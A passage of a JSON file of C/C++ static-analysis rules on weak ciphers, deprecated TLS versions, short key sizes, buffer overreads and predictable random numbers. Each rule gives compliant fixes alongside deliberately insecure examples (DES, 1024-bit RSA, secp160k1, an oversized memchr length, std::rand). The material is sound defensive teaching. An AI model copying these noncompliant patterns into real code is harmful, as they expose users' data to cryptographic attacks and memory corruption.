href=\"https://en.wikipedia.org/wiki/Semantic_security\">Wikipedia, Semantically Secure Cryptosystems</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding\">Wikipedia, OAEP</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Galois/Counter_Mode\">Wikipedia, Galois/Counter Mode</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/327\">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "c:S5547": {
        "name": "Cipher algorithms should be robust",
        "htmlDesc": "<p>This vulnerability makes it possible that the cleartext of the encrypted message might be recoverable without prior knowledge of the key.</p>\n<h2>Why is this an issue?</h2>\n<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communication in various domains. They are used for\nseveral important reasons:</p>\n<ul>\n  <li> Confidentiality, privacy, and intellectual property protection </li>\n  <li> Security during transmission or on storage devices </li>\n  <li> Data integrity, general trust, and authentication </li>\n</ul>\n<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>\n<ol>\n  <li> No encryption is unbreakable. </li>\n  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>\n</ol>\n<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and\nsecure by the cryptography community.</p>\n<h3>What is the potential impact?</h3>\n<p>The cleartext of an encrypted message might be recoverable. Additionally, it might be possible to modify the cleartext of an encrypted message.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Theft of sensitive data</h4>\n<p>The encrypted message might contain data that is considered sensitive and should not be known to third parties.</p>\n<p>By using a weak algorithm the likelihood that an attacker might be able to recover the cleartext drastically increases.</p>\n<h4>Additional attack surface</h4>\n<p>By modifying the cleartext of the encrypted message it might be possible for an attacker to trigger other vulnerabilities in the code. Encrypted\nvalues are often considered trusted, since under normal circumstances it would not be possible for a third party to modify them.</p>\n<h2>How to fix it in Botan</h2>\n<h3>Code examples</h3>\n<p>The following code contains examples of algorithms that are not considered highly resistant to cryptanalysis and thus should be avoided.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n#include &lt;botan/cipher_mode.h&gt;\n\nvoid encrypt() {\n  Botan::Cipher_Mode::create(\"DES/CBC/PKCS7\", Botan::ENCRYPTION); // Noncompliant\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n#include &lt;botan/cipher_mode.h&gt;\n\nvoid encrypt() {\n  Botan::Cipher_Mode::create(\"AES-256/GCM\", Botan::ENCRYPTION);\n}\n</pre>\n<h3>How does this work?</h3>\n<h4>Use a secure algorithm</h4>\n<p>It is highly recommended to use an algorithm that is currently considered secure by the cryptographic community. A common choice for such an\nalgorithm is the Advanced Encryption Standard (AES).</p>\n<p>For block ciphers, it is not recommended to use algorithms with a block size that is smaller than 128 bits.</p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://botan.randombit.net/handbook/\">Botan</a> - Handbook </li>\n  <li> <a href=\"https://www.feistyduck.com/books/openssl-cookbook/\">OpenSSL</a> - Cookbook </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/327\">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "c:S4423": {
        "name": "Weak SSL/TLS protocols should not be used",
        "htmlDesc": "<p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>\n<h2>Why is this an issue?</h2>\n<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used\nfor several important reasons:</p>\n<ul>\n  <li> Confidentiality, privacy, and intellectual property protection </li>\n  <li> Security during transmission or on storage devices </li>\n  <li> Data integrity, general trust, and authentication </li>\n</ul>\n<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>\n<ol>\n  <li> No encryption is unbreakable. </li>\n  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>\n</ol>\n<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and\nsecure by the cryptography community.</p>\n<p>To provide communication security over a network, SSL and TLS are generally used. However, it is important to note that the following protocols are\nall considered weak by the cryptographic community, and are officially deprecated:</p>\n<ul>\n  <li> SSL versions 1.0, 2.0 and 3.0 </li>\n  <li> TLS versions 1.0 and 1.1 </li>\n</ul>\n<p>When these unsecured protocols are used, it is best practice to expect a breach: that a user or organization with malicious intent will perform\nmathematical attacks on this data after obtaining it by other means.</p>\n<h3>What is the potential impact?</h3>\n<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that\nencryption was supposed to protect.</p>\n<p>Depending on the recovered data, the impact may vary.</p>\n<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>\n<h4>Additional attack surface</h4>\n<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can\nfurther exploit a system to obtain more information.<br> Encrypted values are often considered trustworthy because it would not be possible for a\nthird party to modify them under normal circumstances.</p>\n<h4>Breach of confidentiality and privacy</h4>\n<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,\nfinancial loss, reputational damage, or unauthorized access to confidential systems.</p>\n<p>In this scenario, the company, its employees, users, and partners could be seriously affected.</p>\n<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and\nstakeholders may lose confidence in the organization’s ability to protect their sensitive data.</p>\n<h4>Legal and compliance issues</h4>\n<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the\nplaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>\n<h2>How to fix it in cURL</h2>\n<h3>Code examples</h3>\n<p>The following code samples attempt to create an HTTP request.</p>\n<h4>Noncompliant code example</h4>\n<p>This sample uses Curl’s default TLS algorithms, which are weak cryptographical algorithms: TLSv1.0 and LTSv1.1.</p>\n<pre data-diff-id=\"11\" data-diff-type=\"noncompliant\">\n#include &lt;curl/curl.h&gt;\n\nvoid encrypt() {\n    CURL *curl;\n    curl_global_init(CURL_GLOBAL_DEFAULT);\n\n    curl = curl_easy_init();                                      // Noncompliant\n    curl_easy_setopt(curl, CURLOPT_URL, \"https://example.com/\");\n\n    curl_easy_perform(curl);\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"11\" data-diff-type=\"compliant\">\n#include &lt;curl/curl.h&gt;\n\nvoid encrypt() {\n    CURL *curl;\n    curl_global_init(CURL_GLOBAL_DEFAULT);\n\n    curl = curl_easy_init();\n    curl_easy_setopt(curl, CURLOPT_URL, \"https://example.com/\");\n    curl_easy_setopt(curl, CURLOPT_SSLVERSION, CURL_SSLVERSION_TLSv1_2);\n\n    curl_easy_perform(curl);\n}\n</pre>\n<h3>How does this work?</h3>\n<p>As a rule of thumb, by default you should use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic\ncommunity.</p>\n<p>The best choices at the moment are the following.</p>\n<h4>Use TLS v1.2 or TLS v1.3</h4>\n<p>Even though TLS V1.3 is available, using TLS v1.2 is still considered good and secure practice by the cryptography community.<br></p>\n<p>The use of TLS v1.2 ensures compatibility with a wide range of platforms and enables seamless communication between different systems that do not\nyet have TLS v1.3 support.</p>\n<p>The only drawback depends on whether the framework used is outdated: its TLS v1.2 settings may enable older and insecure cipher suites that are\ndeprecated as insecure.</p>\n<p>On the other hand, TLS v1.3 removes support for older and weaker cryptographic algorithms, eliminates known vulnerabilities from previous TLS\nversions, and improves performance.</p>\n<h2>Resources</h2>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Padding_oracle_attack\">Wikipedia, Padding Oracle Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Chosen-ciphertext_attack\">Wikipedia, Chosen-Ciphertext Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Chosen-plaintext_attack\">Wikipedia, Chosen-Plaintext Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Semantic_security\">Wikipedia, Semantically Secure Cryptosystems</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding\">Wikipedia, OAEP</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Galois/Counter_Mode\">Wikipedia, Galois/Counter Mode</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/327\">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "c:S4426": {
        "name": "Cryptographic keys should be robust",
        "htmlDesc": "<p>This vulnerability exposes encrypted data to attacks whose goal is to recover the plaintext.</p>\n<h2>Why is this an issue?</h2>\n<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used\nfor several important reasons:</p>\n<ul>\n  <li> Confidentiality, privacy, and intellectual property protection </li>\n  <li> Security during transmission or on storage devices </li>\n  <li> Data integrity, general trust, and authentication </li>\n</ul>\n<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>\n<ol>\n  <li> No encryption is unbreakable. </li>\n  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>\n</ol>\n<p>In today’s cryptography, the length of the <strong>key</strong> directly affects the security level of cryptographic algorithms.</p>\n<p>Note that depending on the algorithm, the term <strong>key</strong> refers to a different mathematical property. For example:</p>\n<ul>\n  <li> For RSA, the key is the product of two large prime numbers, also called the <strong>modulus</strong>. </li>\n  <li> For AES and Elliptic Curve Cryptography (ECC), the key is only a sequence of randomly generated bytes.\n    <ul>\n      <li> In some cases, AES keys are derived from a master key or a passphrase using a Key Derivation Function (KDF) like PBKDF2 (Password-Based Key\n      Derivation Function 2) </li>\n    </ul>  </li>\n</ul>\n<p>If an application uses a key that is considered short and <strong>insecure</strong>, the encrypted data is exposed to attacks aimed at getting at\nthe plaintext.</p>\n<p>In general, it is best practice to expect a breach: that a user or organization with malicious intent will perform cryptographic attacks on this\ndata after obtaining it by other means.</p>\n<h3>What is the potential impact?</h3>\n<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that\nencryption was supposed to protect.</p>\n<p>Depending on the recovered data, the impact may vary.</p>\n<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>\n<h4>Additional attack surface</h4>\n<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can\nfurther exploit a system to obtain more information.<br> Encrypted values are often considered trustworthy because it would not be possible for a\nthird party to modify them under normal circumstances.</p>\n<h4>Breach of confidentiality and privacy</h4>\n<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,\nfinancial loss, reputational damage, or unauthorized access to confidential systems.</p>\n<p>In this scenario, the company, its employees, users, and partners could be seriously affected.</p>\n<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and\nstakeholders may lose confidence in the organization’s ability to protect their sensitive data.</p>\n<h4>Legal and compliance issues</h4>\n<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the\nplaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>\n<h2>How to fix it in Botan</h2>\n<h3>Code examples</h3>\n<p>The following code examples either explicitly or implicitly generate keys. Note that there are differences in the size of the keys depending on the\nalgorithm.</p>\n<p>Due to the mathematical properties of the algorithms, the security requirements for the key size vary depending on the algorithm.<br> For example,\na 256-bit ECC key provides about the same level of security as a 3072-bit RSA key and a 128-bit symmetric key.</p>\n<h4>Noncompliant code example</h4>\n<p>Here is an example of a private key generation with RSA:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n#include &lt;botan/pubkey.h&gt;\n#include &lt;botan/rng.h&gt;\n#include &lt;botan/rsa.h&gt;\n\nvoid encrypt() {\n    std::unique_ptr&lt;Botan::RandomNumberGenerator&gt;   rng(new Botan::System_RNG);\n    Botan::RSA_PrivateKey                           rsaKey(*rng, 1024); // Noncompliant\n}\n</pre>\n<p>Here is an example with the generation of a key as part of a Discrete Logarithmic (DL) group, a Digital Signature Algorithm (DSA) parameter:</p>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\n#include &lt;botan/dl_group.h&gt;\n\nvoid encrypt() {\n    Botan::DL_Group(\"dsa/botan/1024\"); // Noncompliant\n}\n</pre>\n<p>Here is an example of an Elliptic Curve (EC) initialization. It implicitly generates a private key whose size is indicated in the elliptic curve\nname:</p>\n<pre data-diff-id=\"3\" data-diff-type=\"noncompliant\">\n#include &lt;botan/ec_group.h&gt;\n\nvoid encrypt() {\n    Botan::EC_Group(\"secp160k1\"); // Noncompliant\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n#include &lt;botan/pubkey.h&gt;\n#include &lt;botan/rng.h&gt;\n#include &lt;botan/rsa.h&gt;\n\nvoid encrypt() {\n    std::unique_ptr&lt;Botan::RandomNumberGenerator&gt;   rng(new Botan::System_RNG);\n    Botan::RSA_PrivateKey                           rsaKey(*rng, 2048);\n}\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\n#include &lt;botan/dl_group.h&gt;\n\nvoid encrypt() {\n    Botan::DL_Group(\"dsa/botan/2048\");\n}\n</pre>\n<pre data-diff-id=\"3\" data-diff-type=\"compliant\">\n#include &lt;botan/ec_group.h&gt;\n\nvoid encrypt() {\n    Botan::EC_Group(\"secp224k1\");\n}\n</pre>\n<h3>How does this work?</h3>\n<p>As a rule of thumb, use the cryptographic algorithms and mechanisms that are considered strong by the cryptography community.</p>\n<p>The appropriate choices are the following.</p>\n<h4>RSA (Rivest-Shamir-Adleman) and DSA (Digital Signature Algorithm)</h4>\n<p>The security of these algorithms depends on the difficulty of attacks attempting to solve their underlying mathematical problem.</p>\n<p>In general, a minimum key size of <strong>2048</strong> bits is recommended for both. It provides 112 bits of security. A key length of\n<strong>3072</strong> or <strong>4092</strong> should be preferred when possible.</p>\n<h4>AES (Advanced Encryption Standard)</h4>\n<p>AES supports three key sizes: 128 bits, 192 bits and 256 bits. The security of the AES algorithm is based on the computational complexity of trying\nall possible keys.<br> A larger key size increases the number of possible keys and makes exhaustive search attacks computationally infeasible.\nTherefore, a 256-bit key provides a higher level of security than a 128-bit or 192-bit key.</p>\n<p>Currently, a minimum key size of <strong>128 bits</strong> is recommended for AES.</p>\n<h4>Elliptic Curve Cryptography (ECC)</h4>\n<p>Elliptic curve cryptography is also used in various algorithms, such as ECDSA, ECDH, or ECMQV. The length of keys generated with elliptic curve\nalgorithms is mentioned directly in their names. For example, <code>secp256k1</code> generates a 256-bits long private key.</p>\n<p>Currently, a minimum key size of <strong>224 bits</strong> is recommended for EC-based algorithms.</p>\n<p>Additionally, some curves that theoretically provide sufficiently long keys are still discouraged. This can be because of a flaw in the curve\nparameters, a bad overall design, or poor performance. It is generally advised to use a NIST-approved elliptic curve wherever possible. Such curves\ncurrently include:</p>\n<ul>\n  <li> NIST P curves with a size of at least 224 bits, e.g. secp256r1. </li>\n  <li> Curve25519, generally known as ed25519 or x25519 depending on its application. </li>\n  <li> Curve448. </li>\n  <li> Brainpool curves with a size of at least 224 bits, e.g. brainpoolP224r1 </li>\n</ul>\n<h3>Going the extra mile</h3>\n<h4>Pre-Quantum Cryptography</h4>\n<p>Encrypted data and communications recorded today could be decrypted in the future by an attack from a quantum computer.<br> It is important to keep\nin mind that NIST-approved digital signature schemes, key agreement, and key transport may need to be replaced with secure quantum-resistant (or\n\"post-quantum\") counterpart.</p>\n<p>Thus, if data is to remain secure beyond 2030, proactive measures should be taken now to ensure its safety.</p>\n<p><a href=\"https://www.enisa.europa.eu/publications/post-quantum-cryptography-current-state-and-quantum-mitigation\">Learn more here</a>.</p>\n<h2>Resources</h2>\n<ul>\n  <li> Documentation\n    <ul>\n      <li> NIST Documentation - <a href=\"https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-186.pdf\">NIST SP 800-186: Recommendations\n      for Discrete Logarithm-based Cryptography: Elliptic Curve Domain Parameters</a> </li>\n      <li> IETF - <a href=\"https://datatracker.ietf.org/doc/html/rfc5639\">rfc5639: Elliptic Curve Cryptography (ECC) Brainpool Standard Curves and\n      Curve Generation</a> </li>\n    </ul>  </li>\n</ul>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://learn.microsoft.com/en-us/dotnet/standard/security/vulnerabilities-cbc-mode\">Microsoft, Timing vulnerabilities with CBC-mode\n  symmetric decryption using padding</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Padding_oracle_attack\">Wikipedia, Padding Oracle Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Chosen-ciphertext_attack\">Wikipedia, Chosen-Ciphertext Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Chosen-plaintext_attack\">Wikipedia, Chosen-Plaintext Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Semantic_security\">Wikipedia, Semantically Secure Cryptosystems</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding\">Wikipedia, OAEP</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Galois/Counter_Mode\">Wikipedia, Galois/Counter Mode</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements\">Mobile AppSec\n  Verification Standard - Cryptography Requirements</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography\">Mobile Top 10 2016 Category M5 -\n  Insufficient Cryptography</a> </li>\n  <li> <a href=\"https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar1.pdf\">NIST 800-131A</a> - Recommendation for Transitioning the\n  Use of Cryptographic Algorithms and Key Lengths </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/326\">CWE-326 - Inadequate Encryption Strength</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/327\">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/hDdGBQ\">CERT, MSC61-J.</a> - Do not use insecure or weak cryptographic algorithms </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "c:S5782": {
        "name": "POSIX functions should not be called with arguments that trigger buffer overflows",
        "htmlDesc": "<p>Some POSIX functions take one argument that is a buffer and another one that represents the size of the buffer. It is up to the developer to make\nsure the two arguments do match and that the size argument does not exceed the buffer’s size.</p>\n<h2>Why is this an issue?</h2>\n<p>When the size argument exceeds the actual size of the buffer, the memory management functions will either read or write data past the buffer memory\nboundary into adjacent memory. Because the memory might be uninitialized or contain other pieces of data, the behavior of the affected function can\nnot be predicted and will likely trigger bugs.</p>\n<h3>What is the potential impact?</h3>\n<p>Buffer boundaries violations can lead to serious security issues.</p>\n<h4>Information disclosure</h4>\n<p>In some scenarios, insecure functions can lead to information disclosure. For instance, if an attacker can cause a buffer overread, they might be\nable to disclose data in memory that they’re not supposed to have access to. This could potentially allow them to access sensitive information, such\nas passwords or encryption keys. An example of a buffer overread is provided with the Heartbleed vulnerability. ==== Code execution</p>\n<p>In some cases, an attacker can craft input in a way that allows them to gain unauthorized access to your system. For example, they might be able to\noverwrite a function’s return address in memory, causing your program to execute code of the attacker’s choosing. This could potentially give the\nattacker full control over your system.</p>\n<h4>Denial of service</h4>\n<p>If an attacker can trigger a buffer overflow by providing oversized input, it can cause the program to crash. If the attacker repeats this process,\nit can continually disrupt the service, denying access to other users. This can be particularly damaging for services that require high availability,\nsuch as online platforms or databases.</p>\n<p>In some cases, the input might cause the program to enter an infinite loop or consume excessive memory, slowing down the system or even causing it\nto become unresponsive. This type of attack is known as a resource exhaustion DoS attack.</p>\n<h3>Exceptions</h3>\n<p>Functions related to sockets using the type <code>socklen_t</code> are not checked. This is because these functions are using a C-style polymorphic\npattern using <code>union</code>. It relies on a mismatch between allocated memory and sizes of structures and it creates false positives.</p>\n<h2>How to fix it</h2>\n<h3>Code examples</h3>\n<p>In the following code example, <code>memchr</code> is used to find the first occurrence of the <code>@</code> character in a buffer,\n<code>array</code>. The second argument does not match the size of this buffer, so it may find an occurrence of the character after the end of the\nbuffer and read data it is not supposed to. If the returned <code>pos</code> pointer is later used to write characters, this could unexpectedly\noverwrite data.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nchar array[10];\ninitialize(array);\nchar *pos = memchr(array, '@', 42); // Noncompliant\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nchar array[10];\ninitialize(array);\nchar *pos = memchr(array, '@', sizeof(array));\n</pre>\n<h2>Resources</h2>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> Heartbleed - <a href=\"https://heartbleed.com/\">The Heartbleed Bug</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/\">Top 10 2021 - A06 - Vulnerable and Outdated\n  Components</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities\">Top 10 2017 Category A9 -\n  Using Components with Known Vulnerabilities</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/119\">CWE-119 - Improper Restriction of Operations within the Bounds of a Memory\n  Buffer</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/131\">CWE-131 - Incorrect Calculation of Buffer Size</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/788\">CWE-788 - Access of Memory Location After End of Buffer</a> </li>\n</ul>\n<h3>External coding guidelines</h3>\n<ul>\n  <li> CERT - <a href=\"https://wiki.sei.cmu.edu/confluence/x/wtYxBQ\">ARR30-C. - Do not form or use out-of-bounds pointers or array subscripts</a>\n  </li>\n  <li> CERT - <a href=\"https://wiki.sei.cmu.edu/confluence/x/i3w-BQ\">STR50-CPP. - Guarantee that storage for strings has sufficient space for\n  character data and the null terminator</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "c:S2245": {
        "name": "Using pseudorandom number generators (PRNGs) is security-sensitive",
        "htmlDesc": "<p>Using pseudorandom number generators (PRNGs) is security-sensitive. For example, it has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-6386\">CVE-2013-6386</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3419\">CVE-2006-3419</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4102\">CVE-2008-4102</a> </li>\n</ul>\n<p>When software generates predictable values in a context requiring unpredictability, it may be possible for an attacker to guess the next value that\nwill be generated, and use this guess to impersonate another user or access sensitive information.</p>\n<p>As the functions rely on a pseudorandom number generator, they should not be used for security-critical applications or for protecting sensitive\ndata.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> the code using the generated value requires it to be unpredictable. It is the case for all encryption mechanisms or when a secret value, such\n  as a password, is hashed. </li>\n  <li> the function you use generates a value which can be predicted (pseudo-random). </li>\n  <li> the generated value is used multiple times. </li>\n  <li> an attacker can access the generated value. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Use functions which rely on a strong random number generator such as <code>randombytes_uniform()</code> or <code>randombytes_buf()</code> from\n  <code>libsodium</code>, or <code>randomize()</code> from Botan. </li>\n  <li> Use the generated random values only once. </li>\n  <li> You should not expose the generated random value. If you have to store it, make sure that the database or file is secure. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\n#include &lt;random&gt;\n// ...\n\nvoid f() {\n  int random_int = std::rand(); // Sensitive\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n#include &lt;sodium.h&gt;\n#include &lt;botan/system_rng.h&gt;\n// ...\n\nvoid f() {\n  char random_chars[10];\n  randombytes_buf(random_chars, 10); // Compliant\n  uint32_t random_int = randombytes_uniform(10); // Compliant\n\n  uint8_t random_chars[10];\n  Botan::System_RNG system;\n  system.randomize(random_chars, 10); // Compliant\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements\">Mobile AppSec\n  Verification Standard - Cryptography Requirements</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography\">Mobile Top 10 2016 Category M5 -\n  Insufficient Cryptography</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/338\">CWE-338 - Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG)</a>\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/330\">CWE-330 - Use of Insufficiently Random Values</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/326\">CWE-326 - Inadequate Encryption Strength</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/1241\">CWE-1241 - Use of Predictable Algorithm in Random Number Generator</a> </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/UNcxBQ\">CERT, MSC30-C.</a> - Do not use the rand() function for generating pseudorandom numbers\n  </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/2ns-BQ\">CERT, MSC50-CPP.</a> - Do not use std::rand() for generating pseudorandom numbers </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://h3xstream.github.io/find-sec-bugs/bugs.htm#PREDICTABLE_RANDOM\">Predictable Pseudo Random Number\n  Generator</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "c:S5527": {
        "name": "Server hostnames should be verified during SSL/TLS connections",
